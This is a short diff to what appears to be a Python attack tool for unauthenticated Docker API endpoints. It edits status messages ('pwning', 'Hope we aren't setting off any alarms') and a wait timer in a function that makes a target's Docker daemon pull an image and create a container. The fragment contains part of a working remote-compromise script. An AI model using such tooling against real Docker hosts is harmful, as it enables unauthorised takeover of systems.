@@ -33,15 +33,15 @@ def create(target, port, image):
 
     try:
 
-        print("[+] Downloading latest Alpine Image for a lightweight pwning experience.\n")
+        print("[+] Downloading specified image for a lightweight pwning experience.\n")
 
         dockerConnection.request('POST', '/images/create?fromImage=alpine&tag=latest')
         imageStatus = dockerConnection.getresponse()
 
         if imageStatus.status == 200:
-            print("[+] Alpine image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.\n")
+            print("[+] Image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.\n")
             dockerConnection.close()
-            timeout = time.time() + 1#60*4
+            timeout = time.time() + 60*4
             while time.time() < timeout:
 	            cursorWait="\|/-\|/-"
 	            for l in cursorWait:
@@ -54,7 +54,7 @@ def create(target, port, image):
             dockerConnection.close()
             sys.exit(0)
 
-        print("[+] Alright, creating Alpine Linux Container now...\n")
+        print("[+] Alright, creating container now...\n")
 
         containerJSON = json.dumps({
             "Hostname": "",
